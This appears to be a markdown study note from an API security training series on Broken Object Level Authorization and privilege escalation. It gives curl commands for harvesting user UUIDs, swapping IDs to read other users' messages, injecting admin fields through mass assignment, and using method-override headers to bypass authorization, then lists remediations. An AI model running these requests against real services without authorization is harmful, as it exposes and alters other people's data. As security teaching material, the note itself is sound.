# 🎯 Day 3: Broken Object Level Authorization (BOLA) & Privilege Escalation
**Focus:** Testing the "Authorization" layer. This research investigates how to bypass permission checks to access or modify data belonging to other users.

---

## 📘 Theory: Authentication vs. Authorization
* **Authentication (AuthN):** "Who are you?" (Identity verified by JWT).
* **Authorization (AuthZ):** "What are you allowed to do?" (Permissions verified by Backend).
* **BOLA:** The #1 API vulnerability. It occurs when a server trusts a user-supplied ID without verifying if the user owns that object.



---

## 🕵️‍♂️ The 5-Step Investigation Flow

### 🛠️ Step 1: Hunting for Identifiers
I first map the API to find where IDs are used.
* **URL:** `/api/v1/users/101/profile`
* **Query:** `/api/v1/download?file_id=999`
* **Body:** `{"order_id": "ORD-44"}`

### 🛠️ Step 2: ID Harvesting (The Investigation)
If IDs are non-guessable (UUIDs), I find them in public endpoints.
```bash
# Extracting Target UUIDs from public search results
curl -s "[https://api.site.com/v1/public/users](https://api.site.com/v1/public/users)" | grep -E -o "[0-9a-f]{8}-([0-9a-f]{4}-){3}[0-9a-f]{12}"
🛠️ Step 3: The BOLA Attack (The Swap)
Testing if I can see another user's private data using my valid token.

Bash

# Swapping my ID for the Target ID harvested in Step 2
curl -X GET "[https://api.site.com/v1/messages/TARGET_ID](https://api.site.com/v1/messages/TARGET_ID)" \
-H "Authorization: Bearer <MY_VALID_TOKEN>"
🛠️ Step 4: Mass Assignment (The Injection)
Testing if I can change my own permissions by adding "hidden" admin fields.

Bash

# Injecting 'is_admin' into a standard profile update request
curl -X PATCH "[https://api.site.com/v1/user/update](https://api.site.com/v1/user/update)" \
-H "Content-Type: application/json" \
-H "Authorization: Bearer <TOKEN>" \
-d '{"username": "new_name", "is_admin": true, "role": "admin"}'
🛠️ Step 5: Advanced Bypasses (Header/Method Tampering)
If a direct swap is blocked (403), I try to confuse the Gateway/WAF.

Method Override: POST that acts as a DELETE.

Header Injection: Adding X-User-ID to force identity.

Bash

# Using Header Override to bypass Authorization filters
curl -X POST [https://api.site.com/v1/user/101](https://api.site.com/v1/user/101) \
-H "X-HTTP-Method-Override: DELETE" \
-H "Authorization: Bearer <TOKEN>"
📊 Results Analysis
Vulnerable: 200 OK or 204 No Content when accessing/changing other users' data.

Secure: 403 Forbidden or 401 Unauthorized across all bypass attempts.

🛡️ Remediation Strategy
Enforce Object Ownership: Backend must check JWT.sub == resource.owner_id.

Input Filtering: Use strict "Allow-lists" to block Mass Assignment.

Randomized IDs: Use UUID v4 to prevent ID enumeration.
